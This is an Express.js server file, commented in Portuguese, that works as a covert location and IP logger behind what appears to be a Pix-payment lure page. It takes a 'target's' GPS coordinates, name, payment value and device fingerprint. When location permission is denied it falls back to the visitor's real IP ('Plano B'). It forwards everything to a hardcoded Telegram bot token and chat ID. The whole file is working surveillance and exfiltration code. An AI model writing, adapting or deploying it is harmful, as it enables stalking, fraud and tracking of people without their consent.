// server.js - COM PLANO B (IP LOGGER)
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Seus dados do Telegram
const TELEGRAM_BOT_TOKEN = "8510330829:AAG5Z_9XupX2x_GqeXPgfAooOjVC61L78v8";
const TELEGRAM_CHAT_ID = "-5124871642";

app.post("/send-location", async (req, res) => {
  // 1. Recebe todos os dados (inclusive os novos do Fingerprint)
  const {
    latitude, longitude, maps,      // Dados de GPS (podem vir vazios se bloquear)
    nome, valor,                    // Dados do Pix
    bateria, conexao, ram, cpu, tela, navegador // Fingerprint
  } = req.body;

  // 2. CAPTURA DE IP (Mágica do Plano B)
  // Pega o IP real ignorando proxies do Render/Vercel
  const ipBruto = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userIp = ipBruto ? ipBruto.split(',')[0].trim() : "Oculto";

  let message = "";

  // --- CENÁRIO 1: SUCESSO TOTAL (Tem GPS) ---
  if (latitude && longitude) {
    message = `
🚨 <b>LOCALIZAÇÃO CAPTURADA!</b> 🚨

🎯 <b>Alvo:</b> ${nome || 'Não informado'}
💰 <b>Valor:</b> R$ ${valor || 'Não informado'}

📍 <b>Lat:</b> <code>${latitude}</code>
📍 <b>Long:</b> <code>${longitude}</code>
🗺️ <b>Maps:</b> ${maps}
🌐 <b>IP Real:</b> <code>${userIp}</code>

📱 <b>DADOS DO DISPOSITIVO:</b>
🔋 Bat: ${bateria || '?'} | 📡 Rede: ${conexao || '?'}
💻 CPU: ${cpu || '?'} | 💾 RAM: ${ram || '?'}
🖥️ Tela: ${tela || '?'}
🌐 Nav: ${navegador || '?'}
`;
  }
  // --- CENÁRIO 2: PLANO B (Só IP + Device) ---
  else {
    message = `
⛔ <b>GPS BLOQUEADO (PLANO B)</b> ⛔

O alvo negou a permissão, mas pegamos o IP!

🌐 <b>IP Capturado:</b> <code>${userIp}</code>
🎯 <b>Alvo:</b> ${nome || 'Não informado'}

📱 <b>DADOS DO DISPOSITIVO:</b>
🔋 Bat: ${bateria || '?'}
📡 Rede: ${conexao || '?'}
🖥️ Tela: ${tela || '?'}
🌐 Nav: ${navegador || '?'}
`;
  }

  try {
    // Envia para o Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML"
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro no envio." });
  }
});

const port = process.env.PORT || 8088;
app.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});

app.use(express.static(__dirname));
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});
